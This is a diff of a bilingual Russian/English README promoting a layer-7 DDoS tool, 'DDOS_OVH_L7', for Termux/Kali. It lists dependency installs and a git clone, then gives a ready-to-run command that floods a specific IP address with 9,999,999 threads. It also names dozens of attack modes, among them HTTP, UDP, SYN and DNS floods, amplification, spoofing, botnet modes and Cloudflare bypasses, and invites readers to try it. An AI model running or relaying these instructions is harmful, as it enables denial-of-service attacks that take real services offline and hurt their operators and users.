@@ -11,6 +11,8 @@ termux kali linux DDOS L7
 🌐 Минимальное потребление интернет-трафика: Моя программа снижает нагрузку на вашу сеть, позволяя вам экономить драгоценный интернет-трафик.
 
 Для запуска программы, сначала убедитесь, что у вас установлены необходимые библиотеки и пакеты. Выполните следующие команды в вашем терминале для их установки:
+
+```
 pip install requests
 pip install requests_toolbelt
 pip install socks
@@ -20,9 +22,11 @@ pip install scapy
 pkg install python-cryptography
 pip install aiohttp
 pip install ntplib
-Некоторые другие пакеты, такие как socks, ipaddress и ntplib, могут уже быть установлены, так как они часто входят в состав стандартной библиотеки Python.
-После установки всех необходимых зависимостей вы можете запустить программу с помощью следующей команды:
-python DDOS_OVH.py --url http://37.187.56.77 --method OVH GET --threads 9999999
+git clone https://github.com/MaksimBoykoMusic/DDOS_OVH_L7.git
+cd DDOS_OVH_L7
+Run Python Script: python DDOS_OVH.py --url http://37.187.56.77 --method OVH GET --threads 9999999
+```
+
 Доступные методы 'GET', 'POST', 'HEAD', 'HTTP-SYN', 'HTTP-SYN-TPC', 'OVH', 'OVH BOT', 'DGB', 'AVB', 'CFBUAM', 'BYPASS', 'CFB', 'GSB', 'uambypass', 'BOTNET_V1','BOTNET_V2', 'SYN', 'AMP', 'socks_cflow', 'TCP_ATTACK', 'CFSOC', 'BOMB', 'ovh2', 'STRESS', 'Connection', 'TLSv2', 'cc', 'ntp_mem','ICMPFlood','UDPFlood','udp_flood','attackSKY','RHEX','NULL','COOKIES','Launchspoof','attackbypass','LaunchCFPRO','dgb_solver','http_flood','PPS','dns_flood','BOT_V1','https_spoof','KILLER'
 Я уже не могу дождаться, когда вы попробуете эту программу и поделитесь своими впечатлениями. Приглашаю вас внести свой вклад и присоединиться к этому захватывающему проекту! 💪
 
@@ -36,6 +40,8 @@ Key features of the project:
 🌐 Minimal internet traffic consumption: My program reduces the load on your network, helping you save precious internet bandwidth.
 
 To run the program, first ensure that you have the required libraries and packages installed. Execute the following commands in your terminal to install them:
+
+```
 pip install requests
 pip install requests_toolbelt
 pip install socks
@@ -48,10 +54,18 @@ pip install ntplib
 git clone https://github.com/MaksimBoykoMusic/DDOS_OVH_L7.git
 cd DDOS_OVH_L7
 Run Python Script: python DDOS_OVH.py --url http://37.187.56.77 --method OVH GET --threads 9999999
+```
 
 Some other packages, such as socks, ipaddress, and ntplib, may already be installed as they are often part of the standard Python library.
 
 After installing all the necessary dependencies, you can run the program using the following command
+
+```
 Available methods include 'GET,' 'POST,' 'HEAD,' 'HTTP-SYN,' 'HTTP-SYN-TPC,' 'OVH,' 'OVH BOT,' 'DGB,' 'AVB,' 'CFBUAM,' 'BYPASS,' 'CFB,' 'GSB,' 'uambypass,' 'BOTNET_V1,' 'BOTNET_V2,' 'SYN,' 'AMP,' 'socks_cflow,' 'TCP_ATTACK,' 'CFSOC,' 'BOMB,' 'ovh2,' 'STRESS,' 'Connection,' 'TLSv2,' 'cc,' 'ntp_mem,' 'ICMPFlood,' 'UDPFlood,' 'udp_flood,' 'attackSKY,' 'RHEX,' 'NULL,' 'COOKIES,' 'Launchspoof,' 'attackbypass,' 'LaunchCFPRO,' 'dgb_solver,' 'http_flood,' 'PPS,' 'dns_flood,' 'BOT_V1,' 'https_spoof,' 'KILLER.'
+```
 
 I can't wait for you to try out this program and share your feedback. I invite you to contribute and be a part of this exciting project! 💪
+
+```
+
+```
